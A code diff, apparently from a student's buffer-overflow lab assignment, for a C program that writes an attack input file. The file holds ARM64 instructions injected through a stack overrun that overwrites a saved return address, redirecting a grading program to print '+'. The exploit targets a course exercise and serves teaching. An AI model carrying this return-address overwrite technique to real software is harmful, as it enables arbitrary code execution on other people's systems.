@@ -22,31 +22,28 @@ int main(void)
     unsigned int ulData;  /* Address of A instruction */
     unsigned long addr = 0x420060;  /* Address of A instruction */
 
-    psFILE = fopen("dataA", "w");
+    psFILE = fopen("dataAplus", "w");
     fprintf(psFILE, "Grace");   /* Write our names to file */
     fprintf(psFILE, "%c", '\0');     /* Write null byte after name */
     for (i = 0; i < 2; i++)
     {
         fprintf(psFILE, "%c", '\0');
     }
-
-    /* mov x1, 'A' */
-    ulData = MiniAssembler_mov(0, 'A');
+    /* mov x1, '+' */
+    ulData = MiniAssembler_mov(1, '+');
     fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
-    
-    /* adr x0, grade */
-    ulData = MiniAssembler_adr(1, 0x420044, addr + 4);
+
+    /* adr x0, string */
+    ulData = MiniAssembler_adr(0, 0x400920, addr + 4);
     /* Overwrite getName's stored x30 w/ instruction to get a A */
     fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
-
     
-
-    /*str x1, [x0]*/
-    ulData = MiniAssembler_strb(0, 1);
+    /*bl 0x400690 <printf@plt>*/
+    ulData = MiniAssembler_bl(0x400690, addr + 8);
     fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
 
-    /* b 0x40087c */
-    ulData = MiniAssembler_b(0x40089c, addr + 12);
+    /* b 0x4008b0 */
+    ulData = MiniAssembler_b(0x4008b0, addr + 12);
     fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
 
     /* Write padding of 18(?) characters to overrun stack */
